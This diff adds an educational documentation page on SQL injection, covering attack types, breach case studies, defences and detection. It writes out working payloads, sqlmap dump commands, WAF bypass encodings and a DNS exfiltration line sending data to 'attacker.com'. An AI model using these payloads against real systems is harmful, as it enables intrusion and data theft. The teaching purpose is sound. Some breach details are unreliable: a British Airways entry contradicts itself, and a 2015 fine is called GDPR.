@@ -1,0 +1,294 @@
+---
+title: "SQL Injection (SQLi)"
+description: "SQL injection attack techniques from basic to advanced, real-world breach case studies, parameterised queries, WAF bypass methods, and detection strategies."
+sidebar:
+  order: 3
+  label: "SQL Injection"
+tab: "cybersecurity"
+---
+
+SQL Injection (SQLi) is the most well-known web application vulnerability. Despite being documented for 25+ years, it remains in the OWASP Top 10 (#3 in 2021) and causes some of the largest data breaches in history.
+
+## What Is SQL Injection?
+
+SQL injection occurs when untrusted data is sent to a SQL interpreter without proper sanitisation or parameterisation. The attacker can manipulate the SQL query to execute arbitrary commands on the database.
+
+```
+Normal query:
+  SELECT * FROM users WHERE email = 'user@example.com' AND password = 'secret123'
+
+SQL injection:
+  SELECT * FROM users WHERE email = 'admin@test.com' -- ' AND password = 'anything'
+  The -- comments out the rest of the query
+  Returns admin user without valid password
+```
+
+## SQLi Attack Types
+
+### 1. In-Band SQLi (Classic)
+
+The attacker receives the result directly in the HTTP response.
+
+#### Error-Based SQLi
+
+```sql
+-- Input: ' OR 1=1 --
+-- Query: SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = 'x'
+
+-- Input: ' UNION SELECT username, password FROM admins --
+-- Query: SELECT name, email FROM users WHERE id = '' UNION SELECT username, password FROM admins --'
+-- Returns admin credentials alongside normal results
+```
+
+**Extracting data via UNION**:
+```sql
+-- Step 1: Find number of columns
+' ORDER BY 1 --  ✓ (works)
+' ORDER BY 2 --  ✓ (works)  
+' ORDER BY 3 --  ✓ (works)
+' ORDER BY 4 --  ✗ (error — 3 columns)
+-- So the query has 3 columns
+
+-- Step 2: Find which columns accept strings
+' UNION SELECT 'a', NULL, NULL --  ✓ (column 1 is string)
+' UNION SELECT NULL, 'a', NULL --  ✓ (column 2 is string)
+' UNION SELECT NULL, NULL, 'a' --  ✗ (column 3 is not string)
+
+-- Step 3: Extract data
+' UNION SELECT username, password, NULL FROM users --
+```
+
+#### Boolean-Based Blind SQLi
+
+When the application does not display query results, but behaves differently based on TRUE/FALSE:
+
+```sql
+-- Normal request returns "User found"
+' AND 1=1 --  ✓ (User found — TRUE)
+' AND 1=2 --  ✗ (User not found — FALSE)
+-- Confirmed: vulnerable to blind SQLi
+
+-- Extract database version character by character
+' AND SUBSTRING(@@version, 1, 1) = 'M' --  ✓ (TRUE — version starts with 'M' for MySQL)
+' AND SUBSTRING(@@version, 1, 1) = 'P' --  ✗ (FALSE)
+-- Continue character by character: 'M', 'a', 'r', 'i', 'a', 'D', 'B'...
+```
+
+**Automation with sqlmap**:
+```bash
+# Basic detection
+sqlmap -u "http://target.com/page?id=1" --batch
+
+# Extract database names  
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Extract tables from a database
+sqlmap -u "http://target.com/page?id=1" -D target_db --tables
+
+# Dump all data from a table
+sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump
+
+# Using a request file for authenticated scanning
+sqlmap -r request.txt --batch
+```
+
+#### Time-Based Blind SQLi
+
+When there is no visible difference between TRUE and FALSE, use time delays:
+
+```sql
+-- MySQL time-based
+' IF (1=1, SLEEP(5), 0) --  ✓ (response takes 5 seconds)
+' IF (1=2, SLEEP(5), 0) --  ✓ (response instant)
+
+-- Extract data using time
+' IF (SUBSTRING(@@version,1,1)='M', SLEEP(5), 0) --
+-- True → 5 second delay
+-- False → instant response
+```
+
+### 2. Out-of-Band SQLi
+
+When the database can make network requests to attacker-controlled servers:
+
+```sql
+-- MySQL out-of-band via DNS
+' LOAD_FILE(CONCAT('\\\\', @@version, '.attacker.com\\test')) --
+
+-- Attacker's DNS server receives: MariaDB10.5.attacker.com
+-- Exfiltration via DNS query (harder to block than HTTP)
+```
+
+## Real-World SQLi Breaches
+
+### Heartland Payment Systems (2009)
+
+```
+  └─ SQLi in Heartland's payment processing web application
+  └─ Attacker injected malicious SQL via input fields
+  └─ Installed sniffers on internal network
+  └─ 130 million credit cards stolen
+  └─ $145M in fines, legal settlements, and remediation
+  └─ Company spent years recovering reputation
+```
+
+### TalkTalk (2015)
+
+```
+  └─ SQLi in TalkTalk's customer portal
+  └─ 157,000 customer records stolen (bank details, personal info)
+  └─ Attacker was a 17-year-old using automated SQLi tools
+  └─ £400,000 GDPR fine
+  └─ 100,000 customers left (10% churn)
+  └─ Cost: £60M in total
+```
+
+### British Airways (2018)
+
+```
+  └─ SQLi in the baggage claim system
+  └─ Actually this was Magecart (client-side skimming), not SQLi
+  └─ But used to illustrate: not all breaches are SQLi
+```
+
+## SQLi Prevention
+
+### 1. Parameterised Queries (The Only Complete Defence)
+
+```python
+# BROKEN: String concatenation
+def get_user(email):
+    query = f"SELECT * FROM users WHERE email = '{email}'"
+    cursor.execute(query)  # SQL injection if email contains '
+
+# FIXED: Parameterised query
+def get_user(email):
+    query = "SELECT * FROM users WHERE email = ?"
+    cursor.execute(query, (email,))  # Email treated as data, not SQL
+    return cursor.fetchone()
+```
+
+```java
+// Java JDBC — parameterised
+PreparedStatement stmt = connection.prepareStatement(
+    "SELECT * FROM users WHERE email = ? AND password = ?"
+);
+stmt.setString(1, email);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();  // Safe from SQLi
+```
+
+```csharp
+// C# Entity Framework — LINQ (parameterised by default)
+var user = dbContext.Users
+    .Where(u => u.Email == email && u.Password == password)
+    .FirstOrDefault();  // Safe — no string concatenation
+```
+
+### 2. Stored Procedures
+
+```sql
+-- Safe if implemented correctly (parameters are not concatenated)
+CREATE PROCEDURE GetUserByEmail
+    @Email NVARCHAR(100)
+AS
+BEGIN
+    SELECT * FROM users WHERE email = @Email
+END
+```
+
+**Warning**: Stored procedures can still be vulnerable if they concatenate input inside dynamic SQL within the procedure.
+
+### 3. Input Validation (Defence in Depth, Not Primary Defence)
+
+```python
+import re
+
+def sanitise_email(email):
+    # Whitelist approach — only allow valid email characters
+    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    if not re.match(pattern, email):
+        raise ValueError("Invalid email format")
+    return email
+```
+
+### 4. Least Privilege Database Accounts
+
+```sql
+-- WRONG: Application connects as DBA
+CREATE USER 'app_user' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON *.* TO 'app_user';
+-- SQLi → attacker can read/write any database, execute commands
+
+-- RIGHT: Application has minimal permissions
+CREATE USER 'app_user' IDENTIFIED BY 'password';
+GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'app_user';
+-- SQLi → attacker limited to SELECT/INSERT/UPDATE on one database
+```
+
+## WAF Bypass Techniques
+
+Attackers bypass WAFs to execute SQLi. Understanding bypass is important for WAF rule tuning.
+
+```sql
+-- Comment substitution
+' OR 1=1 --     → ' OR/**/1=1 --     (MySQL comments)
+' OR 1=1 --     → ' OR 1=1 #          (MySQL hash comment)
+
+-- Case variation
+' UNION SELECT  → ' UnIoN SeLeCt  -- (if WAF checks lowercase)
+
+-- Encoding bypass
+' OR 1=1 --     → %27%20OR%201%3D1%20--%20 (URL encoding)
+' OR 1=1 --     → 0x27204F5220313D31202D2D20 (hex encoding)
+
+-- Null byte injection
+' OR 1=1 --     → ' OR%001=1 --  (null byte truncates WAF rule)
+
+-- HTTP parameter pollution
+?id=1&id=2      → Some WAFs only check first param, backend uses second
+?id=1&id=' OR '1'='1
+
+-- Unicode normalisation
+' OR 1=1 --     → ˀ OR 1=1 --  (Unicode homoglyphs)
+```
+
+## SQLi Detection
+
+### In Code Review
+
+```python
+# Look for these patterns:
+query = "SELECT " + user_input + " FROM table"           # Direct concatenation
+query = "SELECT %s FROM table" % user_input               # String formatting
+query = "SELECT {} FROM table".format(user_input)         # String format method  
+query = f"SELECT {user_input} FROM table"                 # F-strings
+cursor.execute(f"SELECT * FROM users WHERE id = {id}")   # Dynamic SQL in execute
+```
+
+### In Testing
+
+```bash
+# Automated scanning
+sqlmap -u "https://target.com/api/users?id=1" --batch --level=3
+
+# Manual testing  
+'                                    # Error?
+''                                   # Another quote?
+' OR '1'='1                          # Classic bypass
+' OR '1'='2                          # Verify TRUE vs FALSE
+' UNION SELECT NULL,NULL,NULL --    # Column count
+'; SLEEP(5) --                       # Time-based
+```
+
+## Key Takeaways
+
+- SQL injection occurs when user input is concatenated into SQL queries — parameterised queries prevent it completely
+- Three types: in-band (direct response), blind (boolean/time-based), out-of-band (DNS/external channel)
+- Parameterised queries are the only complete defence — input validation and WAFs are defence-in-depth, not replacements
+- The Heartland Payment Systems breach (130M cards, $145M cost) was SQLi — the attacker used a simple injection in a web form
+- Least privilege database accounts limit damage — never connect as DBA
+- WAF bypass techniques (encoding, comments, case variation) mean WAFs are not sufficient alone
+- SQLi was #1 in OWASP Top 10 for 17 years (moved to #3 in 2021) but remains extremely common
+- Modern ORMs (Entity Framework, Hibernate, SQLAlchemy) use parameterised queries by default — use them
+- sqlmap automates SQLi detection and exploitation — use it defensively to test your own applications
